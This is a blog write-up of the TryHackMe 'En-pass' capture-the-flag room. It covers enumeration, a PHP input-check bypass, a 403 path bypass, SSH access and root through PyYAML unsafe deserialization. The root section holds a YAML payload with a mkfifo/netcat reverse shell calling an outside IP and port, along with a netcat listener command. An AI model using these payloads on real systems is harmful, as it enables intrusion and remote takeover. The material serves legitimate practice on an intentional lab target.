---
layout: post
author: Razor
title: "Tryhackme En-pass"
categories: [Tryhackme, Linux]
tags: [boot2root, custom exploitation, medium-box, privilage escalation, cve, web exploitation, enumeration]     # TAG names should always be lowercase
image: assets/thm_en-pass/bg.jpeg
toc: true
---
## Introduction
This is partical room from tryhackme entitled En-pass with Medium difficulty. In this room we will learn about web exploitation and privilage escalation . room link [here](https://tryhackme.com/room/enpass)

## Enumeration

### Nmap 
what we have to do first is scanning the ip :
```
$ nmap -sC -sV -oA nm 10.10.144.190

Nmap scan report for 10.10.144.190
Host is up (0.33s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA)
|   256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA)
|_  256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519)
8001/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: En-Pass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
as you can see we just have 2 port open which ssh and webserver. Now, lets take a look at webserver : 

![img](/assets/thm_en-pass/bg_1.jpeg)

### gobuster

We don't find anything here, so let's search some directories or file using the gobuster or wfuzz tools
```
$ gobuster dir -u http://10.10.88.227:8001/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.88.227:8001/
[+] Threads:        10
[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/14 22:32:30 Starting gobuster
===============================================================
/web (Status: 301)
/reg.php (Status: 200)
/403.php (Status: 403)
/zip (Status: 301)
Progress: 6719 / 220561 (3.05%)
```
after scanning we have 2 directory and 2 file .php. now lets check directory web :
on this web directory we continue to search the directory until we find the key file

```
$ gobuster dir -u http://10.10.88.227:8001/web/resources/infoseek/configure/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.88.227:8001/web/resources/infoseek/configure/
[+] Threads:        10
[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/14 22:43:57 Starting gobuster
===============================================================
/key (Status: 200)
Progress: 2214 / 220561 (1.00%)
```
![img](/assets/thm_en-pass/bg_2.jpeg)

## Exploit

now we have keys like id_rsa to get connected shell but the problem is we dont have password and username for the key. now lets go to /reg.php

![img](/assets/thm_en-pass/bg_3.jpeg)

then if found the source code of php, you can see the source code :
```bat
 <?php
if($_SERVER["REQUEST_METHOD"] == "POST"){
   $title = $_POST["title"];
   if (!preg_match('/[a-zA-Z0-9]/i' , $title )){
          
          $val = explode(",",$title);

          $sum = 0;
          
          for($i = 0 ; $i < 9; $i++){

                if ( (strlen($val[0]) == 2) and (strlen($val[8]) ==  3 ))  {

                    if ( $val[5] !=$val[8]  and $val[3]!=$val[7] ) 
            
                        $sum = $sum+ (bool)$val[$i]."<br>"; 
                }   
          
          }

          if ( ($sum) == 9 ){
            

              echo $result;//do not worry you'll get what you need.
              echo " Congo You Got It !! Nice ";     
            
            }
                    else{

                      echo "  Try Try!!";

                
                    }
          }
        
          else{
            echo "  Try Again!! ";  
          }     
 
  }


 
?>
```
### Getting password and username

after analyze the code we can exploit by putting alphanumeric characters which will break down some of our title variables into an array. In the code we have to be able to pass the title variable so that there will be 9 elements in the array. so in order to solve this we have to use 8 comma "," in the title variable.

so now I tried several possibilities and i can pass this with this code : `!!,!,!,!,!,!,!,$,@@@`

i will explain that why i'm using that code,You can see in the "(strlen ($ val [0]) == 2)" which means that in array 0 there must be 2 characters, the "(strlen ($ val [8]) == 3)" in the 8th array must have 3 characters and multiple checks like that.  

![img](/assets/thm_en-pass/bg_4.jpeg)

> Note : You have to try it yourself and don't copy the password from the picture or you'll be a fool :D

now we have password but not yet for the user, so lets go to /zip

![img](/assets/thm_en-pass/bg_5.jpeg)

So since I don't want to spend my time looking at them one by one I will create a simple script to see all the files. this is the script that I use:
```
nano zip.sh

for i in `seq 1 100`; do wget -q http://10.10.88.227:8001/zip/a$i.zip && unzip a$i.zip && cat a && rm a && rm a$i.zip; done

```

![img](/assets/thm_en-pass/bg_6.jpeg)

as I guessed it is not useful at all :D, there everything outputing sadman . a bit annoying to someone make this box XD. now lets check 403.php
`http://10.10.88.227:8001/403.php`
![img](/assets/thm_en-pass/bg_7.jpeg)

i got nothing but thm tell us some hint 

![img](/assets/thm_en-pass/bg_8.jpeg)

now I will check the end point with several possibilities using [403fuzzer](https://github.com/intrudir/403fuzzer) such as X-Forwarded-For, besides this it also applies several different loads which are usually used in travesal dir or what we usually know wfuzz to each endpoint on the path

> Note : This tool will check the endpoint with a couple of headers such as X-Forwarded-For It will also apply different payloads typically used in dir traversals path normalization etc. to each endpoint on the path. e.g. /%2e/test/test2 /test/%2e/test2 /test;/test2/

```
$ python3 403fuzzer.py -u http://10.10.88.227:8001/403.php -hc 403,404
Response Code: 200      Length: 2563    Path: /
Response Code: 200      Length: 2563    Path: /
Response Code: 400      Length: 306     Path: /%2e%2e/403.php
Response Code: 400      Length: 306     Path: /../403.php
Response Code: 200      Length: 2563    Path: /
Response Code: 400      Length: 306     Path: /%2e%2e/403.php
Response Code: 400      Length: 306     Path: /../../../403.php
Response Code: 400      Length: 306     Path: /../..//../403.php
Response Code: 400      Length: 306     Path: /../../403.php
Response Code: 400      Length: 306     Path: /../..;/403.php
Response Code: 400      Length: 306     Path: /.././../403.php
Response Code: 400      Length: 306     Path: /../.;/../403.php
Response Code: 400      Length: 306     Path: /..//../../403.php
Response Code: 400      Length: 306     Path: /..//../403.php
Response Code: 400      Length: 306     Path: /../403.php
Response Code: 400      Length: 306     Path: /../;/../403.php
Response Code: 400      Length: 306     Path: /../;/403.php
Response Code: 400      Length: 306     Path: //../../403.php
Response Code: 400      Length: 306     Path: ///../403.php
Response Code: 200      Length: 2563    Path: /
Response Code: 200      Length: 2563    Path: /403.php%3b/%2e.
Response Code: 200      Length: 2563    Path: /403.php%3b/..
Response Code: 200      Length: 2563    Path: /403.php/%2e%2e
Response Code: 200      Length: 2563    Path: /403.php/%2e%2e/
Response Code: 200      Length: 2563    Path: /403.php/..
Response Code: 200      Length: 2563    Path: /403.php/../
Response Code: 400      Length: 306     Path: /403.php/../../
Response Code: 400      Length: 306     Path: /403.php/../../../
Response Code: 200      Length: 2563    Path: /403.php/../../..//
Response Code: 200      Length: 2563    Path: /403.php/../..//
Response Code: 400      Length: 306     Path: /403.php/../..//../
Response Code: 400      Length: 306     Path: /403.php/.././../
Response Code: 200      Length: 2563    Path: /403.php/../.;/../
Response Code: 200      Length: 2563    Path: /403.php/..//
Response Code: 200      Length: 2563    Path: /403.php/..//../
Response Code: 400      Length: 306     Path: /403.php/..//../../
Response Code: 200      Length: 2563    Path: /403.php/../;/../
Response Code: 200      Length: 917     Path: /403.php/..;/
Response Code: 200      Length: 2563    Path: /403.php//../../
```
as you can see we have different length `Response Code: 200      Length: 917     Path: /403.php/..;/` I just found this bypass which I think is a bit strange and confusing. however this is a challange and we must solve it :D. 

![img](/assets/thm_en-pass/bg_9.jpeg)

## Gaining access

### User

now we got a username, so we have username and password for key lets jump in to ssh : 

![img](/assets/thm_en-pass/bg_10.jpeg)

lets doing any privilage escalation, i was check it with linpeas but i'm not found any missconfiguration. so im using [pspy](https://github.com/DominicBreuker/pspy) to snooping processes without root. 

> pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

so im run this and i got any hint : 

![img](/assets/thm_en-pass/bg_11.jpeg)

lets check `/opt/scripts` and alayze that : 

```bat
bash-4.3$ cat file.py 
#!/usr/bin/python
import yaml


class Execute():
        def __init__(self,file_name ="/tmp/file.yml"):
                self.file_name = file_name
                self.read_file = open(file_name ,"r")

        def run(self):
                return self.read_file.read()

data  = yaml.load(Execute().run())
```
im try to run this but it gives us below error : 

![img](/assets/thm_en-pass/bg_12.jpeg)

which is where the error is due to the absence of the file.yml file. and im ask to uncle google and give me some suprise [link](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation). lets check if its works or not : 
```
bash-4.3$ python -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'
EXPLOIT!
bash-4.3$
```
and the example is works!!. 

### Root
let's get the shell 

- first i'm create file.yml at /tmp : 
```
!!python/object/new:os.system [rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.47.251 4444 >/tmp/f ]
```
- now in attacker machines using `nc -lvnp 4444`
- lets run file.py and get a shell of root

![img](/assets/thm_en-pass/bg_13.jpeg)

and BOOMMM!! we got the root :D.

Happy hacking :)